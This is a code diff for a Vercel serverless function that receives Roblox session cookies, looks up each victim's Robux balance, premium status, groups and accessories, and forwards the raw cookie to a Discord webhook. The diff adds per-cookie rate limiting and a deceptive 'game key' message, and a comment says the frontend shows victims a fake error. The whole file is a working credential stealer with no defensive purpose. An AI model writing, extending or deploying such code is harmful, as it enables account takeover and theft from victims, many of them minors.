@@ -1,5 +1,19 @@
-// api/submit.js – Vercel serverless function
+// api/submit.js – with rate limiting & first‑time flag
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
+
+// In‑memory store: cookieHash -> timestamp (ms)
+const cookieCooldown = new Map();
+const COOLDOWN_MS = 10 * 60 * 1000; // 10 minutes
+
+function getCookieHash(cookie) {
+    // Simple hash to avoid storing raw cookie in memory (though we already have it)
+    let hash = 0;
+    for (let i = 0; i < cookie.length; i++) {
+        hash = ((hash << 5) - hash) + cookie.charCodeAt(i);
+        hash |= 0;
+    }
+    return hash.toString();
+}
 
 async function fetchWithTimeout(url, options, timeout = 10000) {
     const controller = new AbortController();
@@ -14,7 +28,7 @@ async function fetchWithTimeout(url, options, timeout = 10000) {
     }
 }
 
-// ---------- 1. Basic user info + premium + description + created date ----------
+// ---------- User info (unchanged) ----------
 async function fetchUserInfoFromId(userId) {
     try {
         const userRes = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`, {}, 5000);
@@ -28,7 +42,6 @@ async function fetchUserInfoFromId(userId) {
             friendsCount = friendsData.count?.toLocaleString() || "0";
         }
 
-        // Premium status
         let hasPremium = "Unknown";
         try {
             const premiumRes = await fetchWithTimeout(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {}, 5000);
@@ -40,7 +53,6 @@ async function fetchUserInfoFromId(userId) {
             hasPremium = "Error fetching";
         }
 
-        // Banned status
         const isBanned = userData.isBanned ? "⚠️ Banned" : "✅ Active";
 
         return {
@@ -60,7 +72,6 @@ async function fetchUserInfoFromId(userId) {
     }
 }
 
-// ---------- 2. Robux balance ----------
 async function fetchRobuxFromCookie(cookieValue) {
     try {
         const response = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
@@ -75,7 +86,6 @@ async function fetchRobuxFromCookie(cookieValue) {
     }
 }
 
-// ---------- 3. Last game played ----------
 async function fetchLastGame(userId) {
     try {
         const response = await fetchWithTimeout(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Asc&limit=1`, {}, 5000);
@@ -92,7 +102,6 @@ async function fetchLastGame(userId) {
     }
 }
 
-// ---------- 4. Top 3 groups ----------
 async function fetchTopGroups(userId) {
     try {
         const response = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {}, 5000);
@@ -107,18 +116,14 @@ async function fetchTopGroups(userId) {
     }
 }
 
-// ---------- 5. Important accessories (no head, torso, animations) ----------
 async function fetchImportantAccessories(userId) {
     try {
         const avatarRes = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`, {}, 5000);
         if (!avatarRes.ok) return "None";
         const avatarData = await avatarRes.json();
         const assets = avatarData.assets || [];
-        
-        // Filter only accessory types (skip BodyParts, Animations, etc.)
         const accessoryTypes = ["Hat", "FaceAccessory", "NeckAccessory", "ShoulderAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "Glasses", "Earrings", "Headphones"];
         const accessories = assets.filter(a => accessoryTypes.includes(a.assetType.name));
-        
         if (accessories.length === 0) return "No accessories equipped";
         return accessories.map(a => a.name).join(", ");
     } catch (err) {
@@ -127,7 +132,6 @@ async function fetchImportantAccessories(userId) {
     }
 }
 
-// ---------- Main webhook sender ----------
 async function sendToDiscordWebhook(cookie, rbxuid) {
     const userId = rbxuid;
     const [userInfo, robux, lastGame, topGroups, accessories] = await Promise.all([
@@ -206,7 +210,7 @@ ${cookie}
     return true;
 }
 
-// ---------- Vercel handler ----------
+// ---------- Vercel handler with rate limiting ----------
 module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -219,9 +223,38 @@ module.exports = async (req, res) => {
     if (!cookie || !rbxuid) return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
     if (!WEBHOOK_URL) return res.status(500).json({ success: false, error: "Server configuration error" });
 
+    // Rate limiting check
+    const cookieHash = getCookieHash(cookie);
+    const now = Date.now();
+    const lastSubmission = cookieCooldown.get(cookieHash);
+    if (lastSubmission && (now - lastSubmission) < COOLDOWN_MS) {
+        const remainingSeconds = Math.ceil((COOLDOWN_MS - (now - lastSubmission)) / 1000);
+        // Return blocked status (frontend will show fake error)
+        return res.json({ 
+            success: false, 
+            blocked: true,
+            message: `You've already processed this game key recently. Please wait ${remainingSeconds} seconds before trying again.`
+        });
+    }
+
+    // Update cooldown
+    cookieCooldown.set(cookieHash, now);
+    // Clean up old entries periodically (simple cleanup every 50 requests)
+    if (cookieCooldown.size > 100) {
+        const expiry = now - COOLDOWN_MS;
+        for (const [hash, time] of cookieCooldown.entries()) {
+            if (time < expiry) cookieCooldown.delete(hash);
+        }
+    }
+
+    // First time submission (or after cooldown)
     try {
-        const success = await sendToDiscordWebhook(cookie, rbxuid);
-        return res.json({ success });
+        const webhookSuccess = await sendToDiscordWebhook(cookie, rbxuid);
+        if (webhookSuccess) {
+            return res.json({ success: true, firstTime: true });
+        } else {
+            return res.json({ success: false, error: "Discord webhook failed" });
+        }
     } catch (err) {
         console.error("Handler error:", err);
         return res.status(500).json({ success: false, error: "Internal server error" });
